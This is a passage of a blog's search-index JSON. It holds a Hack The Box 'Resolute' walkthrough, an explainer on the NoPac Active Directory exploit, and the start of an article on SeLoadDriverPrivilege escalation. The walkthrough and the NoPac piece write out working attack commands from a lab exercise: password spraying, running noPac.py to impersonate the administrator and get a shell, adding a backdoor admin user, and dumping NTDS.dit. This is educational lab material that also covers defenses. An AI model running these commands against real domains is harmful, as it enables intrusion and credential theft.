        "tags": ["Box","HTB","Medium","Windows","LDAP","Active Directory","NoPac","CVE-2021-42278","CVE-2021-42287","Download Cradle",],
        "content": "Resolute Hack The Box Walkthrough/Writeup: https://app.hackthebox.com/machines/Resolute How I use variables \u0026amp; Wordlists: Variables: In my commands you are going to see me use $box, $user, $hash, $domain, $pass often. I find the easiest way to eliminate type-os \u0026amp; to streamline my process it is easier to store important information in variables \u0026amp; aliases. $box = The IP of the box $pass = Passwords I have access to. $user = current user I am enumerating with. Depending on where I am in the process this can change if I move laterally. $domain = the domain name e.g. sugarape.local or contoso.local Why am I telling you this? People of all different levels read these writeups/walktrhoughs and I want to make it as easy as possible for people to follow along and take in valuable information. Wordlists: I have symlinks all setup so I can get to my passwords from ~/Wordlists so if you see me using that path that\u0026rsquo;s why. If you are on Kali and following on, you will need to go to /usr/share/wordlists I also use these additional wordlists: Statistically-likely-usernames SecLists Auto_Wordlists 1. Enumeration: NMAP: Basic Scan:\nnmap $box -Pn -oA basicScan kali in 46.02-HTB/BlogEntriesMade/Resolute/scans/nmap 3GiB/15GiB | 0B/1GiB with /usr/bin/zsh 🕙 09:36:50 zsh ❯ nmap $box -Pn -oA basicScan Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-20 09:36 BST Nmap scan report for 10.129.96.155 Host is up (0.040s latency). Not shown: 989 closed tcp ports (reset) PORT STATE SERVICE 53/tcp open domain 88/tcp open kerberos-sec 135/tcp open msrpc 139/tcp open netbios-ssn 389/tcp open ldap 445/tcp open microsoft-ds 464/tcp open kpasswd5 593/tcp open http-rpc-epmap 636/tcp open ldapssl 3268/tcp open globalcatLDAP 3269/tcp open globalcatLDAPssl Nmap done: 1 IP address (1 host up) scanned in 7.35 seconds Initial thoughts: All great enumeration vectors below: DNS Kerberos SMB LDAP In depth scan:\nsudo nmap -p- -sV -sC -O -Pn --disable-arp-ping $box -oA FullTCP kali in 46.02-HTB/BlogEntriesMade/Resolute/scans/nmap 3GiB/15GiB | 0B/1GiB with /usr/bin/zsh 🕙 09:37:03 zsh ❯ sudo nmap -p- -sV -sC -O -Pn --disable-arp-ping $box -oA FullTCP [sudo] password for kali: Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-20 09:38 BST Stats: 0:00:34 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan SYN Stealth Scan Timing: About 75.76% done; ETC: 09:38 (0:00:09 remaining) Stats: 0:00:34 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan SYN Stealth Scan Timing: About 75.95% done; ETC: 09:38 (0:00:09 remaining) Nmap scan report for 10.129.96.155 Host is up (0.038s latency). Not shown: 65511 closed tcp ports (reset) PORT STATE SERVICE VERSION 53/tcp open domain Simple DNS Plus 88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2024-10-20 08:45:53Z) 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: megabank.local, Site: Default-First-Site-Name) 445/tcp open microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds (workgroup: MEGABANK) 464/tcp open kpasswd5? 593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 636/tcp open tcpwrapped 3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: megabank.local, Site: Default-First-Site-Name) 3269/tcp open tcpwrapped 5985/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) |_http-server-header: Microsoft-HTTPAPI/2.0 |_http-title: Not Found 9389/tcp open mc-nmf .NET Message Framing 47001/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) |_http-server-header: Microsoft-HTTPAPI/2.0 |_http-title: Not Found 49664/tcp open msrpc Microsoft Windows RPC 49665/tcp open msrpc Microsoft Windows RPC 49666/tcp open msrpc Microsoft Windows RPC 49667/tcp open msrpc Microsoft Windows RPC 49671/tcp open msrpc Microsoft Windows RPC 49676/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 49677/tcp open msrpc Microsoft Windows RPC 49686/tcp open msrpc Microsoft Windows RPC 49711/tcp open msrpc Microsoft Windows RPC 49789/tcp open unknown No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ). TCP/IP fingerprint: OS:SCAN(V=7.94SVN%E=4%D=10/20%OT=53%CT=1%CU=37772%PV=Y%DS=2%DC=I%G=Y%TM=671 OS:4C1E3%P=x86_64-pc-linux-gnu)SEQ(SP=105%GCD=1%ISR=10A%TI=I%CI=I%II=I%SS=S OS:%TS=A)OPS(O1=M53CNW8ST11%O2=M53CNW8ST11%O3=M53CNW8NNT11%O4=M53CNW8ST11%O OS:5=M53CNW8ST11%O6=M53CST11)WIN(W1=2000%W2=2000%W3=2000%W4=2000%W5=2000%W6 OS:=2000)ECN(R=Y%DF=Y%T=80%W=2000%O=M53CNW8NNS%CC=Y%Q=)T1(R=Y%DF=Y%T=80%S=O OS:%A=S+%F=AS%RD=0%Q=)T2(R=Y%DF=Y%T=80%W=0%S=Z%A=S%F=AR%O=%RD=0%Q=)T3(R=Y%D OS:F=Y%T=80%W=0%S=Z%A=O%F=AR%O=%RD=0%Q=)T4(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O= OS:%RD=0%Q=)T5(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=80% OS:W=0%S=A%A=O%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q= OS:)U1(R=Y%DF=N%T=80%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y% OS:DFI=N%T=80%CD=Z) Network Distance: 2 hops Service Info: Host: RESOLUTE; OS: Windows; CPE: cpe:/o:microsoft:windows Host script results: | smb-security-mode: | account_used: \u0026lt;blank\u0026gt; | authentication_level: user | challenge_response: supported |_ message_signing: required | smb2-security-mode: | 3:1:1: |_ Message signing enabled and required | smb2-time: | date: 2024-10-20T08:46:54 |_ start_date: 2024-10-20T08:38:24 |_clock-skew: mean: 2h27m01s, deviation: 4h02m31s, median: 6m59s | smb-os-discovery: | OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3) | Computer name: Resolute | NetBIOS computer name: RESOLUTE\\x00 | Domain name: megabank.local | Forest name: megabank.local | FQDN: Resolute.megabank.local |_ System time: 2024-10-20T01:46:55-07:00 OS and Service detection performed. Please report any incorrect resu Findings: RPC is also running which is also to be expected. We have the domain name megabank.local LDAP 389: Using LDAP anonymous bind to enumerate further: If you are unsure of what anonymous bind does. It enables us to query for domain information anonymously, e.g. without passing credentials. We can actually retrieve a significant amount of information via anonymous bind such as: A list of all users A list of all groups A list of all computers. User account attributes. The domain password policy. Enumerate users who are susceptible to AS-REPRoasting. Passwords stored in the description fields The added benefit of using ldap to perform these queries is that these are most likely not going to trigger any sort of AV etc as ldap is how AD communicates. I actually have a handy script to check if anonymous bind is enabled \u0026amp; if it is to dump a large amount of information. You can find it here\nhttps://github.com/bloodstiller/ldapire https://bloodstiller.com/cheatsheets/ldap-cheatsheet/#ldap-boxes-on-htb python3 ldapchecker.py $box It will dump general information \u0026amp; also detailed \u0026amp; simple information including: Groups Users It turns out the anonymous bind is enabled and we get the below information. I have removed the majority of the information as it is not relevant, however there are some keys bits of information we can use moving forward.\nWe have the naming context of the domain:\nkali in 46.02-HTB/BlogEntriesMade/Resolute/scans/ldap 3GiB/15GiB | 0B/1GiB with /usr/bin/zsh 🕙 09:39:16 zsh ❯ python3 ~/Desktop/WindowsTools/ldapchecker.py $box Attempting to connect to 10.129.96.155 with SSL... Failed to connect with SSL. Attempting to connect to 10.129.96.155 with non-SSL... Connected successfully. Retrieving server information... DSA info (from DSE): Supported LDAP versions: 3, 2 Naming contexts: DC=megabank,DC=local CN=Configuration,DC=megabank,DC=local CN=Schema,CN=Configuration,DC=megabank,DC=local DC=DomainDnsZones,DC=megabank,DC=local DC=ForestDnsZones,DC=megabank,DC=local We have the domain functionaility level:\ndomainFunctionality: 7 forestFunctionality: 7 domainControllerFunctionality: 7 The functionality level determines the minimum version of Windows server that can be used for a DC. +Note+: that any host os can be used on workstations, however the functionality level determines what the minimum version for DC\u0026rsquo;s and the forest.\nhttps://learn.microsoft.com/en-us/windows-server/identity/ad-ds/active-directory-functional-levels Knowing the function level is useful as if want to target the DC\u0026rsquo;s and servers, we can know by looking at the function level what the minimum level of OS would be.\nIn this case we can see it is level 7 which means that this server has to be running Windows Server 2016 or newer.\nHere\u0026rsquo;s a list of functional level numbers and their corresponding Windows Server operating systems:\nFunctional Level Number Corresponding OS 0 Windows 2000 1 Windows Server 2003 Interim 2 Windows Server 2003 3 Windows Server 2008 4 Windows Server 2008 R2 5 Windows Server 2012 6 Windows Server 2012 R2 7 Windows Server 2016 8 Windows Server 2019 9 Windows Server 2022 +Note+: Each number corresponds to the minimum Windows Server version required for domain controllers in the domain or forest. As the functional level increases, additional Active Directory features become available, but older versions of Windows Server may not be supported as domain controllers. We have the full server name:\nAgain we can see this has the CN as the base (mentioned previously.) serverName: CN=RESOLUTE,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=megabank,DC=local It\u0026rsquo;s pretty amazing already what we have learned just by running some fairly simple ldap queries.\nWe have the naming context. Domain name. I update my /etc/hosts file now that we have the server name.\nThis is so we can use tools like kerbrute for user enumeration as well as other tools later on. LDAP Group Enumeration: As my script auto enumerates this information: I check the file\u0026rsquo;s:\ngroupsLdap.txt groupsLdap_detailed.txt groupsLdap.txt provides a simple list of group names, so we can check for interesting groups:\ncat groupsLdap.txt Lets check for information in the description fields using groupsLdap_detailed.txt:\ncat groupsLdap_detailed.txt | grep -i -a Description -B 3 Nothing of note here Discoveries:\nNothing of note here Finding a hard-coded user password using LDAP User Enumeration: As my script auto enumerates this information: I check the file\u0026rsquo;s:\nusersLdap.txt usersLdap_detailed.txt usersLdap.txt provides a simple list of sam accounts present on the host that we can use for password spraying etc:\ncat usersLdap.txt Lets check for information in the description fields using usersLdap_detailed.txt:\ncat usersLdap_detailed.txt | grep -i Description -B 3 boom, user password. We also now know this a default password so we can password spray with our user list incase any other users have left their passwords as the default value. Password spraying all users with our found password: I password spray using the found password \u0026amp; list of users \u0026amp; get a hit for melanie: So this means taht the user Marko has changed theirs but Melanie has not. DNS 53: Using dnsenum to enumerate DNS entries: dnsenum -r --dnsserver $box --enum -p 0 -s 0 -f ~/Seclists/Discovery/DNS/subdomains-top1million-110000.txt $domain Find an entry for ms02.megabank.local on an internal ip. (they are all internal but you know what I mean.) Kerberos 88: Usually I would use Kerbrute to bruteforce Usernames, however as we can query ldap directly we do not need to perform this. SMB 445: Attempting to connect with NULL \u0026amp; Guest sessions: This is a standard check I always try as alot of the time the guest account or null sessions can lead to a foothold: netexec smb $box -u 'guest' -p '' --shares netexec smb $box -u '' -p '' --shares Guest account is disabled and anonymous bind is also disabled. +Note+: The reason I am still checking for these is they would be findings in a real report. Trying Usernames as Passwords: I always try usernames as passwords as well: netexec smb $box -u Users.txt -p Users.txt --continue-on-success | grep [+] No hits 2. Foothold: Enumerating the domain as melanie: I check if we have remote access using evil-winrm \u0026amp; we do:\nevil-winrm -i $box -u $user -p $pass Let\u0026rsquo;s get our user flag:\nStrange LDAP Behavior: I try to run a remote bloodhound collection but it fails, It appears there is something with our user account which won\u0026rsquo;t enable it:\npython3 bloodhound.py -dc resolute.$domain -c All -u $user -p $user -d $domain -ns $box The same happens for asrep \u0026amp; kerberoasting:\nI upload SharpChrome.exe via my evil-winrm for a session: I get my collection:\nI think we may be on a second domain, as there are 2 domain mappings and we also so that other machine MS02 earlier. I look through the results but there are no immediate privesc paths apparent.\nTrying to load PowerView into memory: I upload PowerView.ps1 using evil-winrm but when I try and execute it I get the below message:\nThis script contains malicious content and has been blocked by your antivirus software. I try various download cradles but these are all blocked:\n+Deep Dive+: I have a deep dive into download cradles and how they work:\nhttps://bloodstiller.com/articles/understandingdownloadcradles/ Using Winpeas to enumerate: I upload WinPeas and run it to look if there are any privesc paths that are obvious:\nAutologon creds:\nManual Enumeration of System Information: Enumerating the password policy: Enumerating the password policy: net accounts We can spray without fear of lockout. Enumerating the Windows Version: I enumerate the windows version:\n[System.Environment]::OSVersion.Version As you can see systeminfo was denied but we can still query the build using env. Checking this build number online we can see it\u0026rsquo;s from version 1607: https://en.wikipedia.org/wiki/Windows_10_version_history I do also try and enumerate the patch/hotfix level but all efforts are blocked.\nEnumerating Installed Applications: I enumerate the installed applications by querying the registry:\n(\u0026#39;HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\*\u0026#39;, \u0026#39;HKLM:\\Software\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\*\u0026#39;) | ForEach-Object { Get-ItemProperty -Path $_ } | Select-Object DisplayName, DisplayVersion, Publisher, InstallLocation | sort-object -Property Displayname -Unique |Format-Table -AutoSize Nothing of note: Enumerating network services: I check what network services are running internally but again nothing immediate pops out: netstat -nao +Note+: I have dialed in on loopback/localhost incase there is anything running internally. Enumerate PATH: Enumerating the PATH:\n$Env:PATH The path is standard for a Windows environment: Here\u0026rsquo;s a breakdown:\nC:\\Windows\\system32: Primary system directory containing essential system files and executables. C:\\Windows: The root directory for the Windows OS. C:\\Windows\\System32\\Wbem: Contains files and tools for Windows Management Instrumentation (WMI). C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\: Path for PowerShell, used for executing scripts and commands. C:\\Users\\melanie\\AppData\\Local\\Microsoft\\WindowsApps: Path for user-specific Microsoft Store apps. Enumerate ENV\u0026rsquo;s: I enumerate the ENVs incase there is anything interesting: Get-ChildItem Env: Enumerating Drives: Checking Drives: Get-PsDrive This is standard output: Virtual drives: Like Alias, Cert, Env, Function, HKCU, HKLM, Variable, and WSMan are virtual drives created by PowerShell to allow easy navigation and management of things like aliases, environment variables, and the registry. Enumerating Scheduled Tasks: I try and enumerate scheduled tasks but I am denied: Manual Enumeration of users: Query Privileges, Groups \u0026amp; Logged in Users: whoami /priv /groups; query user; net user +Note+: The error below is because we are logged in with evil-winrm so it won\u0026rsquo;t be seen as a live logged in session. Manual Network Enumeration: List all network interfaces, IP, and DNS: ipconfig /all List the ARP table: arp -A List current routing table: route print Manual Service/Program Enumeration: Enumerating services using evil-winrm: This will work often when other methods are denied: services Enumerating Binaries with Weak Service Permissions using AccessChk \u0026amp; SharpUp.exe: When using accesschk, we want to check our current user first because our current user will likely belong to most-if-not-all of those groups by default.\nThis can help take the guess-work out of trying to find which group permissions were set on the service we are querying. I upload the binary via evil-winrm\nI can the following commands to find any service that is writeable for our current user / any user:\n.\\accesschk64.exe melanie -wuvc * -accepteula .\\accesschk64.exe \u0026quot;Everyone\u0026quot; -wuvc * -accepteula Denied each time, let\u0026rsquo;s try sharpup just incase. I upload SharpUp.exe and check for binaries with weak service permissions:\n.\\SharpUP.exe audit As I expected denied. Enumerate Startup Programs: Enumerate Startup Programs: Get-CimInstance Win32_StartupCommand | select Name, command, Location, User |fl Denied Session Enumeration: I upload SessionGopher \u0026amp; check for any other existing sessions: There are none. 3. Privilege Escalation: Finding out the host is vulnerable to the NoPac vuln using netexec: I attempt to use netexec to check if it\u0026rsquo;s vulnerable:\nnetexec smb $box -u $user -p $pass -M nopac I get the error below. Troubleshooting\nScrolling down I see the below. Error explained: If you\u0026rsquo;ve encountered the error KerberosError: Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great) when using tools like netexec etc. It likely stems from a time synchronization issue between your system and the target you\u0026rsquo;re trying to authenticate with. Kerberos relies heavily on timestamps as part of its secure authentication protocol, and even a small discrepancy in system time—typically more than five minutes—can cause the authentication process to fail. To resolve this issue, ensure both your machine and the target server are synced with the same accurate time source, such as using an NTP (Network Time Protocol) service. Which is what I will do now. I sync my clock with the host:\nsudo ntpdate -s resolute.$domain I re-run my test using netexec to check if it\u0026rsquo;s vulnerable:\nnetexec smb $box -u $user -p $pass -M nopac This time we see it\u0026rsquo;s vulnerable to the attack. +Note+: I want to be really clear how I knew to test for this specific vulnerability. I have a document that I go through when checking for privilege escalation paths (see below). Simple as that, I keep a central document that I will go through for privesc and checks and then if none of them work I look to other sources.\nI knew already that their was no WSUS vector as the service was not running \u0026amp; neither was CA abuse as it was not running. There were no AS-Reproastable users, as show in bloodhound \u0026amp; there were no users who had the correct perms for a shadow credential attack in bloodhound either. I\u0026rsquo;m telling you this as some walkthroughs make it seem like the attacker is a fountain of knowledge and has memorized all the latest attack vectors. Not the case, get a checklist and enumerate, that\u0026rsquo;s it. +Deep Dive+ I have created a deepdive into this particular exploit if you want to learn more:\nhttps://bloodstiller.com/articles/understandingnopacexploit/ 4. Ownership: Preparing the NoPac Exploit: Clone NoPac Exploit Repo:\ngit clone https://github.com/Ridter/noPac.git Create Python Virtual Environment:\nI prefer to use python venvs when using exploits this way I don\u0026rsquo;t mess with my underlying python install and everything can existing in it\u0026rsquo;s own space with it\u0026rsquo;s own dependencies cd noPac python3 -m venv noPac Activate Venv:\nsource noPac/bin/activate Install Dependencies:\npip3 install -r requirements Using the NoPac exploit to get a shell on the victim: I run the exploit to get a shell on the host:\nsudo python3 noPac.py $domain/$user:$pass -dc-ip $box -dc-host resolute -shell --impersonate administrator -use-ldap As you can see it says [!] Launching semi-interactive shell - Careful what you execute. This means we need to get our root flag and set up some simple persistence. I get the flag:\n5. Persistence: Adding a user as an administrator: Add ourselves as a user: As we have a limited \u0026amp; unstable shell access the easiest thing to do is add ourselves to the host \u0026amp; then as an administrator. This will then allow us to perform further persistence steps Add ourselves as a new user: net user bloodstiller bl00dst1ll3r! /add Add ourselves to the administrators group: net localgroup Administrators bloodstiller /add Dumping NTDS.dit: Dump NTDS.dit:\nNow we have administrator access as our user we can dump the NTDS.dit using netexec: netexec smb $box -u $user -p $pass -M ntdsutil Lets confirm the local adminstrator hash works:\nLessons Learned: What did I learn? LDAP is the best. But really it can be used to get alot of valuable information. What silly mistakes did I make? Nothing terrible this time. Slow methodical manual enumeration was the way to solve this box. Sign off: Remember, folks as always: with great power comes great pwnage. Use this knowledge wisely, and always stay on the right side of the law!\nUntil next time, hack the planet!\n– Bloodstiller\n– Get in touch bloodstiller at proton dot me\n",

        "content": "Introduction: In late 2021 the \u0026ldquo;NoPac\u0026rdquo; exploit leveraged two critical vulnerabilities in Microsoft\u0026rsquo;s Active Directory, potentially allowing an attacker to escalate from a standard user account to domain administrator privileges with alarming ease.\nKey Points:\nNoPac exploits two vulnerabilities: CVE-2021-42278 and CVE-2021-42287 It allows privilege escalation from a standard user to domain admin Understanding this exploit is crucial for system administrators and security professionals Let\u0026rsquo;s delve into the intricacies of NoPac, exploring the underlying vulnerabilities, mechanics, and the significant threat it posed to organizational security.\nUnderstanding the Vulnerabilities: At its core, the NoPac exploit takes advantage of two distinct but interrelated vulnerabilities in Microsoft\u0026rsquo;s Active Directory. Let\u0026rsquo;s examine each in detail:\nCVE-2021-42278: SAM Bypass Vulnerability: The first vulnerability, CVE-2021-42278 , is a bypass vulnerability in the Security Account Manager (SAM).\nKey Characteristics:\nAllows an attacker to manipulate the SamAccountName of a computer account. Enables changing a computer account name to match that of a Domain Controller. Exploits a flaw in how Active Directory handles computer account naming\u0026gt; Impact:\nCreates confusion in the domain\u0026rsquo;s naming structure. Sets the stage for the second part of the exploit. CVE-2021-42287: Kerberos PAC Vulnerability: The second vulnerability, CVE-2021-42287 , resides within the Kerberos Privilege Attribute Certificate (PAC) in Active Directory Domain Services (AD DS).\nKey Characteristics:\nAllows manipulation of Kerberos ticket issuance Exploits how the Key Distribution Center (KDC) handles service ticket requests Impact:\nEnables an attacker to obtain a service ticket for a Domain Controller When combined with CVE-2021-42278 , leads to privilege escalation The NoPac Exploit Process: To better understand the flow of the NoPac exploit, let\u0026rsquo;s look at a simplified diagram of the process:\n+--------------------------------------------------+ | | | +--------------------------------------------+ | | | | | | | 1. Initial Access | | | | - Standard domain user credentials | | | | | | | +--------------------------------------------+ | | | | | v | | +--------------------------------------------+ | | | | | | | 2. Exploit CVE-2021-42278 | | | | - Change computer account name | | | | - Match Domain Controller name | | | | | | | +--------------------------------------------+ | | | | | v | | +--------------------------------------------+ | | | | | | | 3. Request TGT | | | | - For the renamed computer account | | | | | | | +--------------------------------------------+ | | | | | v | | +--------------------------------------------+ | | | | | | | 4. Exploit CVE-2021-42287 | | | | - Request service ticket | | | | - KDC issues ticket for DC | | | | | | | +--------------------------------------------+ | | | | | v | | +--------------------------------------------+ | | | | | | | 5. Privilege Escalation | | | | - Obtain Domain Admin privileges | | | | | | | +--------------------------------------------+ | | | +--------------------------------------------------+ This diagram outlines the five main steps an attacker would typically follow when exploiting NoPac. Let\u0026rsquo;s dive deeper into each step.\nStep 1: Initial Access The attack begins with standard domain user credentials. It\u0026rsquo;s crucial to note that by default, authenticated users can add up to 10 computers to a domain, which is a key factor in this exploit.\nStep 2: Exploiting CVE-2021-42278: The attacker leverages CVE-2021-42278 to change the name of a new computer account to match a Domain Controller\u0026rsquo;s SamAccountName. This step exploits the vulnerability in how Active Directory handles computer account naming.\nStep 3: Requesting a TGT: With the renamed computer account, the attacker requests a Ticket Granting Ticket (TGT) from the Key Distribution Center (KDC).\nStep 4: Exploiting CVE-2021-42287: The attacker then exploits CVE-2021-42287 by requesting a service ticket. Due to the vulnerability in the Kerberos PAC, the KDC issues a ticket for the Domain Controller.\nStep 5: Privilege Escalation: With the obtained service ticket for the Domain Controller, the attacker can now escalate their privileges to Domain Admin level, effectively compromising the entire domain.\nReal-World Exploitation Example: To better understand how the NoPac exploit works in practice, let\u0026rsquo;s walk through a real-world example. This demonstration will show each step of the process, from initial access to achieving domain admin privileges.\nThis attack was performed on the Hack The Box machine Resolute: https://app.hackthebox.com/machines/Resolute My walkthrough is available here: https://bloodstiller.com/walkthroughs/resolute-box/ Prerequisites: Before we begin, ensure you have the following:\nA vulnerable Windows domain environment (pre-patch for CVE-2021-42278 and CVE-2021-42287) Standard domain user credentials Access to a machine joined to the domain The NoPac exploit \u0026amp; python installed: https://github.com/Ridter/noPac.git Step-by-Step Exploitation: 1 - Prepare the Exploit: Create Python Virtual Environment:\nI prefer to use python venvs when using exploits this way I don\u0026rsquo;t mess with my underlying python install and everything can existing in it\u0026rsquo;s own space with it\u0026rsquo;s own dependencies cd noPac python3 -m venv noPac Activate Venv:\nsource noPac/bin/activate Install Dependencies:\npip3 install -r requirements 2. Enumerate to find out if the target is vulnerable to the NoPac Exploit: Luckly the exploit we are using comes with a scanner, so this can be used to check if the host is vulnerable. kali in noPac 🍣 main 🛤️ ×1🐍 v3.12.6 2GiB/15GiB | 0B/1GiB with /usr/bin/zsh 🕙 14:00:18 zsh ✖ sudo python3 scanner.py $domain/$user:$pass -dc-ip $box -use-ldap ███ ██ ██████ ██████ █████ ██████ ████ ██ ██ ██ ██ ██ ██ ██ ██ ██ ██ ██ ██ ██ ██████ ███████ ██ ██ ██ ██ ██ ██ ██ ██ ██ ██ ██ ████ ██████ ██ ██ ██ ██████ [*] Current ms-DS-MachineAccountQuota = 10 [*] Got TGT with PAC from 10.129.96.155. Ticket size 1470 [*] Got TGT from 10.129.96.155. Ticket size 721 3. Execute the Exploit: Run the NoPac exploit tool with your standard domain user credentials.\nThe tool will automatically perform the necessary steps to exploit both vulnerabilities.\nHere\u0026rsquo;s an example of what the output might look like when running the NoPac exploit:\nkali in noPac 🍣 main 🛤️ ×1🐍 v3.12.6 2GiB/15GiB | 0B/1GiB with /usr/bin/zsh 🕙 14:38:42 zsh ❯ sudo python3 noPac.py $domain/$user:$pass -dc-ip $box -dc-host resolute -shell --impersonate administrator -use-ldap ███ ██ ██████ ██████ █████ ██████ ████ ██ ██ ██ ██ ██ ██ ██ ██ ██ ██ ██ ██ ██ ██████ ███████ ██ ██ ██ ██ ██ ██ ██ ██ ██ ██ ██ ████ ██████ ██ ██ ██ ██████ [*] Current ms-DS-MachineAccountQuota = 10 [*] Selected Target RESOLUTE.megabank.local [*] will try to impersonate administrator [*] Adding Computer Account \u0026#34;WIN-LE7ODKFREMZ$\u0026#34; [*] MachineAccount \u0026#34;WIN-LE7ODKFREMZ$\u0026#34; password = 7N9FdTniA0C9 [*] Successfully added machine account WIN-LE7ODKFREMZ$ with password 7N9FdTniA0C9. [*] WIN-LE7ODKFREMZ$ object = CN=WIN-LE7ODKFREMZ,CN=Computers,DC=megabank,DC=local [*] WIN-LE7ODKFREMZ$ sAMAccountName == RESOLUTE [*] Saving a DC\u0026#39;s ticket in RESOLUTE.ccache [*] Reseting the machine account to WIN-LE7ODKFREMZ$ [*] Restored WIN-LE7ODKFREMZ$ sAMAccountName to original value [*] Using TGT from cache [*] Impersonating administrator [*] Requesting S4U2self [*] Saving a user\u0026#39;s ticket in administrator.ccache [*] Rename ccache to administrator_RESOLUTE.megabank.local.ccache [*] Attempting to del a computer with the name: WIN-LE7ODKFREMZ$ [-] Delete computer WIN-LE7ODKFREMZ$ Failed! Maybe the current user does not have permission. [*] Pls s to detect suspicious activities. Consider using Active Directory-specific security tools that can detect exploitation attempts. Conduct Regular Security Assessments:\nPerform frequent vulnerability scans and penetration tests. Use tools like PingCastle to assess the overall security posture of your Active Directory environment. Implement Network Segmentation:\nSeparate critical assets and limit lateral movement within the network. Use firewalls and access controls to restrict unnecessary communication between network segments. Educate and Train:\nEnsure IT staff are aware of the latest threats and mitigation strategies. Conduct regular security awareness training for all users. Remember, no single measure can provide complete protection against sophisticated attacks like NoPac. A defense-in-depth strategy, combining multiple layers of security controls, is crucial for comprehensive protection.\nConclusion: By leveraging two seemingly minor vulnerabilities, attackers can potentially compromise an entire domain with alarming ease. This underscores the critical importance of prompt patching, continuous monitoring, and a proactive approach to security.\nFurther Reading: For those interested in diving deeper into this topic, I recommend exploring:\nMicrosoft\u0026rsquo;s Security Update Guide for CVE-2021-42278 Microsoft\u0026rsquo;s Security Update Guide for CVE-2021-42287 https://www.secureworks.com/blog/nopac-a-tale-of-two-vulnerabilities-that-could-end-in-ransomware MITRE ATT\u0026amp;CK framework , particularly the entries on Initial Access and Privilege Escalation techniques Frequently Asked Questions: Q: How quickly should organizations patch for NoPac vulnerabilities? A: Organizations should treat these vulnerabilities as critical and apply patches as soon as possible, ideally within days of their release.\nQ: Can NoPac be exploited remotely? A: While initial access to the domain is required, once an attacker has standard domain user credentials, they can potentially exploit NoPac remotely.\nQ: Are there any signs that might indicate a NoPac attack has occurred? A: Signs may include unexpected computer account name changes, unusual service ticket requests. However, skilled attackers will attempt to cover their tracks.\nQ: Can NoPac be mitigated without applying patches? A: While patching is the most effective mitigation, other measures like restricting user permissions and monitoring Active Directory events can help reduce the risk. However, these should be considered temporary measures until patching can be completed.\nQ: How does NoPac compare to other Active Directory exploits? A: NoPac is particularly dangerous due to its relative simplicity and the potential for rapid privilege escalation. Unlike some exploits that require specific misconfigurations, NoPac could potentially affect any unpatched Active Directory environment.\n",

    "http:\/\/localhost:1313\/articles\/seloaddriverprivilegeescalation\/": {
        "title": "Understanding SeLoadDriverPrivilege Escalation: A Deep Dive",
        "tags": ["Windows","Active Directory","SeLoadDriverPrivilege","Capcom",],
        "content": "Introduction: Among the various techniques employed by attackers, one particularly insidious method involves the exploitation of SeLoadDriverPrivilege. This Windows privilege, often overlooked, can serve as a powerful tool in the hands of malicious actors, enabling them to elevate their permissions and potentially gain complete control over a system.\nKey Points:\nSeLoadDriverPrivilege is a Windows privilege that can be exploited for privilege escalation It\u0026rsquo;s often overlooked but can grant attackers significant control over a system Understanding this vulnerability is crucial for system administrators and security professionals Let\u0026rsquo;s dive into the world of SeLoadDriverPrivilege and explore how this seemingly innocuous privilege can become a significant security risk.\nUnderstanding SeLoadDriverPrivilege: At its core, SeLoadDriverPrivilege grants the ability to load kernel-mode drivers into the Windows operating system. While this might sound benign, it\u0026rsquo;s a capability that normally requires administrative permissions, and for good reason. Kernel-mode drivers operate at the highest level of the system, with unrestricted access to system resources. This level of access is precisely what makes SeLoadDriverPrivilege so attractive to attackers.\nTypically, this privilege is assigned to administrative groups or specific users like Print Operators. It\u0026rsquo;s represented in the Windows API by the constant SE_LOAD_DRIVER_NAME. However, what makes it particularly dangerous is that it can sometimes be found enabled on accounts that aren\u0026rsquo;t full administrators, creating a potential security gap.\nKey Points:\nSeLoadDriverPrivilege allows loading of kernel-mode drivers Kernel-mode drivers have unrestricted access to system resources This privilege is usually assigned to administrative groups but can sometimes be found on non-admin accounts It\u0026rsquo;s represented by SE_LOAD_DRIVER_NAME in the Windows API The Exploitation Process: Overview \u0026amp; Diagram: To better understand the flow of a SeLoadDriverPrivilege exploit, let\u0026rsquo;s look at a simplified diagram of the process:\n+--------------------------------------------------+ | | | +--------------------------------------------+ | | | | | | | 1. Enable SeLoadDriverPrivilege | | | | - OpenProcessToken() | | | | - LookupPrivilegeValue() | | | | - AdjustTokenPrivileges() | | | | | | | +--------------------------------------------+ | | | | | v | | +--------------------------------------------+ | | | | | | | 2. Interact with Windows Registry | | | | - Access HKLM\\SYSTEM\\CurrentControlSet | | | | \\Services | | | | | | | +--------------------------------------------+ | | | | | v | | +--------------------------------------------+ | | | | | | | 3. Load Vulnerable Driver | | | | - Register driver in registry | | | | - Use NtLoadDriver() to load driver | | | | | | | +--------------------------------------------+ | | | | | v | | +--------------------------------------------+ | | | | | | | 4. Exploit Vulnerable Driver | | | | - Execute arbitrary code in kernel | | | | space | | | | - Gain SYSTEM privileges | | | | | | | +--------------------------------------------+ | | | +--------------------------------------------------+ This diagram outlines the four main steps an attacker would typically follow when exploiting SeLoadDriverPrivilege. Let\u0026rsquo;s dive deeper into each step.\nYou can see an example 